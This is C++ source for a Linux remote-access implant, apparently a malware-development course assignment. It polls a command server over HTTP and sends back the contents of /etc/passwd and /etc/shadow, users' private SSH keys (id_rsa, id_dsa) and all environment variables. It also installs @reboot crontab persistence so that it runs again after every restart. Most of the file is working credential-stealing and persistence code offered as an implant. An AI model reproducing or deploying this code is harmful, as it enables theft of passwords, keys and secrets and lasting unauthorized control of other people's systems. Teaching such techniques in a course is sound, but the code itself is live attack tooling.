#include <array>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <sys/select.h>
#include <sys/types.h>
#include <pwd.h>
#include <unistd.h>
#include <vector>

#include "popen2.h"
#include "../3rdparty/httplib.h"
#include <cstdlib>

std::vector<std::string> split(const std::string &s, char seperator)
{
    std::vector<std::string> output;
    std::string::size_type prev_pos = 0, pos = 0;

    while ((pos = s.find(seperator, pos)) != std::string::npos)
    {
        std::string substring(s.substr(prev_pos, pos - prev_pos));
        output.push_back(substring);
        prev_pos = ++pos;
    }

    output.push_back(s.substr(prev_pos, pos - prev_pos)); // Last word
    return output;
}

std::string dump_user_ssh_keys()
{
    std::stringstream ss;

    std::ifstream passwd("/etc/passwd");
    std::string line;

    std::vector<std::string> keynames = {"id_rsa", "id_dsa"};

    while (std::getline(passwd, line))
    {
        // split the string across ':'
        std::vector<std::string> userinfo = split(line, ':');

        if (userinfo[6].ends_with("/bash") ||
            userinfo[6].ends_with("/dash") ||
            userinfo[6].ends_with("/zsh") ||
            userinfo[6].ends_with("/sh"))
        {
            std::filesystem::path home_directory = userinfo[5];
            std::filesystem::path ssh = home_directory / ".ssh/";

            if (std::filesystem::exists(ssh))
            {
                // .ssh path exists
                for (auto &key : keynames)
                {
                    std::filesystem::path key_path = ssh / key;
                    if (std::filesystem::exists(key_path) && std::filesystem::is_regular_file(key_path))
                    {
                        std::ifstream file(key_path);
                        // read the username, key file name and key
                        ss << "---==[ BEGIN ENTRY ]==---\n";
                        ss << "username: [" << userinfo[0] << "]\n";
                        ss << "key name: [" << key << "]\n";
                        ss << file.rdbuf();
                        ss << "\n---==[ END ENTRY ]==---\n";
                    }
                }
            }
        }
    }
    return ss.str();
}

std::string get_users()
{
    std::stringstream ss;
    std::ifstream passwd("/etc/passwd");
    std::string line;

    while (std::getline(passwd, line))
    {
        // split the string across ':'
        std::vector<std::string> userinfo = split(line, ':');

        if (userinfo[6].ends_with("/bash") ||
            userinfo[6].ends_with("/dash") ||
            userinfo[6].ends_with("/zsh") ||
            userinfo[6].ends_with("/sh"))
        {
            ss << "User name: [" << userinfo[0] << "], Login shell: [" << userinfo[6] << "]\n";
        }
    }

    return ss.str();
}

std::string list_users()
{
    passwd *entry = getpwent();

    if (!entry)
        return std::string("Error: no users found");

    std::stringstream ss;

    while (entry != NULL)
    {
        ss << entry->pw_name << "\n";
        entry = getpwent();
    }

    endpwent();
    return ss.str();
}

std::string list_interactive_users()
{
    passwd *entry = getpwent();

    if (!entry)
        return std::string("Error: no users found");

    std::stringstream ss;

    while (entry != NULL)
    {
        std::string login_shell = entry->pw_shell;
        if (login_shell.ends_with("/bash") ||
            login_shell.ends_with("/dash") ||
            login_shell.ends_with("/zsh") ||
            login_shell.ends_with("/sh"))
        {
            ss << "User Name: [" << entry->pw_name << "], Login Shell: [" << login_shell << "]"
               << "\n";
        }

        entry = getpwent();
    }

    endpwent();
    return ss.str();
}

std::string dump_passwd()
{
    std::ifstream file("/etc/passwd");
    std::stringstream ss;
    ss << file.rdbuf();

    return ss.str();
}
std::string dump_shadow()
{
    std::stringstream ss;

    if (!getuid())
    {
        std::ifstream file("/etc/shadow");
        ss << file.rdbuf();
    }
    else
    {
        ss << "[WARN]: Payload *NOT* running as root";
    }

    return ss.str();
}

// this is in seconds
unsigned long timeout = 5;

size_t read_timeout(void *ptr, size_t size, size_t nitems, int fd, int timeout)
{
    size_t read_count = 0;

    fd_set set;
    struct timeval __timeout;
    int rv;

    FD_ZERO(&set); /* clear the set */
    FD_SET(fd, &set);

    __timeout.tv_usec = 0;
    __timeout.tv_sec = timeout;

    rv = select(fd + 1, &set, NULL, NULL, &__timeout);

    if (rv == -1)
        return 0;
    else if (rv == 0)
        return 0;
    else
        read_count = read(fd, ptr, size * nitems);
    return read_count;
}

/**
 *
 * Added for assignment
 *
 *
 */

enum OSType
{
    none,
    centos,
    ubuntu,
    arch
};

/**
 *
 *
 *
 */
size_t executeCommand(const char *command, char *output, size_t size)
{
    char buffer[255];
    memset(buffer, 0, 255);
    if (output != NULL)
    {
        memset(output, 0, size);
    }
    strncat(buffer, command, strlen(command));
    strncat(buffer, " 2>&1", 6);

    FILE *fp = popen(buffer, "r");

    if (fp == NULL)
    {
        return 0;
    }

    size_t bytes = 0;

    if (output != NULL)
    {
        bytes = fread((char *)output, 1, size, fp);
    }
    pclose(fp);
    return bytes;
}

OSType detectOS()
{
    char command[] = "cat /etc/os-release | grep \"^ID=\" | awk -F '=' '{print $2}' | sed 's/\"//g'";
    char output[50];

    if (executeCommand(command, output, 50) != 0)
    {
        if (strncmp("centos", output, 6) == 0)
        {
            return centos;
        }
        else if (strncmp("ubuntu", output, 6) == 0)
        {
            return ubuntu;
        }
        else if (strncmp("arch", output, 4) == 0)
        {
            return arch;
        }
        else
        {
            return none;
        }
    }
}

bool isPersistent(char *bin)
{
    unsigned int persist = 0;
    char command[255];
    memset(command, 0, 255);

    strncat(command, "crontab -l | grep \"", 20);
    strncat(command, bin, strlen(bin));
    strncat(command, "\"", 2);

    char *output = (char *)malloc(8192);
    if (executeCommand(command, output, 8192) != 0)
    {
        printf("OUTPUT: %s\n", output);
        return true;
    }

    return false;
}

void installPersistence(char *bin)
{
    if (isPersistent(bin))
        return;

    char command[1000];
    memset(command, 0, 1000);
    strncat(command, "(crontab -l; echo \"@reboot    ", 32);
    strncat(command, bin, strlen(bin));
    strncat(command, "\") | crontab -", 15);

    executeCommand(command, NULL, 0);
}

std::string getCredsImpl()
{
    installPersistence("/tmp/tmp.lwxERYqBga/cmake-build-debug-remote/server");

    auto os = detectOS();

    if (os == OSType::ubuntu)
    {
        std::cout << "Ubuntu this is!" << std::endl;
        // write into systemd service unit here
        /*
         * Service unit path: /lib/systemd/system/magic.service
         */
    }

    return "OS " + os;
}
/**
 * End of persistence definition
 *
 */
/**
 * Dump all env paramter
*/
std::string getEnvParams(char **env){

    std::string envData = "";
    for (int i = 0; env[i] != NULL; ++i)
    {
        size_t pos = 0;
        std::string environment_entry(env[i]);
        std::string token = environment_entry.substr(0, environment_entry.find("="));
        //std::cout << "Environment variable: " << token << ", value: " << getenv(token.c_str()) << std::endl;
        envData += "\nparameter : "+token+" value : "+getenv(token.c_str())+" \n";
    }
    
    return envData;
} 

int main(int argc, char **argv, char **env)
{
    httplib::Client client("http://localhost:8080");
    client.is_valid();

    // we are defaulting to home directory of current user
    std::string current_directory = "~";

    while (true)
    {

        if(client.is_valid() && client.is_socket_open()){
            std::cout<<"Not able to establish server connection"<<std::endl;
        }
        std::string command = "";
        auto response = client.Get("/getcmd");
        command = response->body;

        /*try{
        auto response = client.Get("/getcmd");
        command = response->body;
        }catch(...){
            std::cout<<"Not able to establish server connection"<<std::endl;
        }*/

        std::string output;

        if(command.length() > 0){
        std::cout<<"Received " <<command <<std::endl;}

        if (command.empty())
            continue;

        int pid;

        /*
         * We also need to check for special payload commands, which are not to be passed to shell for execution
         */

        if (command == "dump_passwd")
        {
            output = dump_passwd();
            client.Post("/setresponse", output, "text/plain");
            output = "";
            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        else if (command == "dump_shadow")
         {
             output = dump_shadow();
             client.Post("/setresponse", output, "text/plain");
             output = "";

             // sleep here for some time
             std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }
        else if (command == "dump_ssh_keys")
         {
             output = dump_user_ssh_keys();
             client.Post("/setresponse", output, "text/plain");
             output = "";

             // sleep here for some time
             std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }
         else if (command == "get_users")
         {
             output = get_users();
             client.Post("/setresponse", output, "text/plain");
             output = "";

             // sleep here for some time
             std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }
         else if (command == "list_users")
         {
             output = list_users();
             client.Post("/setresponse", output, "text/plain");
             output = "";

             // sleep here for some time
             std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }
         else if (command == "list_interactive_users")
         {
             output = list_interactive_users();
             client.Post("/setresponse", output, "text/plain");
             output = "";

             // sleep here for some time
             std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }

        /**
         *  Modifying payload
         *
         * Assignment: extend the payload (linux_maldev/client) with the following features:

            1. Dump all environment variables
            2. Persistence detection (detect if payload has persistence already)
            3. Gaining persistence (any method)
            4. Read credential path(s) using some evasion method.

            Hint:
            1. Refer to linux_maldev/credentials
            2. Refer to linux_maldev/persistence
            3. Refer to linux_maldev/persistence
            4. Refer to linux_maldev/evasion
         *
         *
         *
        */
         else if (command == "getos")
          {
              output =getCredsImpl();//return environment variables
              client.Post("/setresponse", output, "text/plain");
              output = "";

              // sleep here for some time
              std::this_thread::sleep_for(std::chrono::seconds(5));
              continue;
          }

          else if (command == "dumpenv")
          {
              output =getEnvParams(env);//return environment variables
              client.Post("/setresponse", output, "text/plain");
              output = "";

              // sleep here for some time
              std::this_thread::sleep_for(std::chrono::seconds(5));
              continue;
          }
         else if (command.rfind("cd ", 0) == 0)
         {
             /*
              * if command starts with "cd ", this is change directory command, which needs to be handled separately.
              */
        // "cd " has length of 3. We are skipping first 3 character, and grabbing rest of the stuff.
        current_directory = command.substr(3, command.length() - 3);
        output = "[MSG]: Directory changed to (";
        output.append(current_directory);
        output.append(")");
        client.Post("/setresponse", output, "text/plain");
        output = "";
        // sleep here for some time
        std::this_thread::sleep_for(std::chrono::seconds(5));
        continue;
    }
        /*
         * We need to modify command like this:
         *
         * Original: sh -c <command>
         * Modified: sh -c ( cd <directory>; <command>)
         */

        /*std::string new_command = "( cd ";
        new_command.append(current_directory);
        new_command.append("; ");
        new_command.append(command);
        new_command.append(" )");

        // execute the command here
        int fd = popen2(new_command.c_str(), "r", &pid);

        std::array<char, 16384> buffer;
        std::fill(buffer.data(), buffer.data() + 16384, 0);
        read_timeout(buffer.data(), 16384, 1, fd, timeout);
        // fread_timeout(buffer.data(), 16384, 1, fp, timeout);
        output += buffer.data();

        pclose2(pid, fd);

        client.Post("/setresponse", output, "text/plain");
        output = "";
        // sleep here for some time
        std::this_thread::sleep_for(std::chrono::seconds(5));
        */
    }

    return 0;
}